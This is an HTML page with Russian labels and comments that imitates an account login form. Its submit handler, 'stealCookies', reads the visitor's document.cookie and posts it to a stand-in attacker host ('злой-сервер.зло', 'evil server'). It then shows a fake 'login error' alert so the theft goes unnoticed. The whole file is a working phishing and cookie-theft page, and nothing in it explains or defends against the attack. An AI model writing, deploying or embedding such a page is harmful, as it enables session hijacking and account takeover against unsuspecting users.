<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Вход в аккаунт</title>
</head>
<body>
  <h1>Введите данные для входа</h1>
  <form action="#" method="POST" onsubmit="stealCookies(event)">
    <label for="username">Логин:</label>
    <input type="text" id="username" name="username" required><br>
    <label for="password">Пароль:</label>
    <input type="password" id="password" name="password" required><br>
    <button type="submit">Войти</button>
  </form>

  <script>
    function stealCookies(event) {
      event.preventDefault(); // Останавливаем стандартную отправку формы
      const cookies = document.cookie; // Получаем все куки текущего пользователя
      
      // Отправляем куки злоумышленнику
      fetch('https://злой-сервер.зло/steal', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ stolenCookies: cookies })
      }).then(() => alert("Ошибка входа, попробуйте снова!"));
    }
  </script>
</body>
</html>
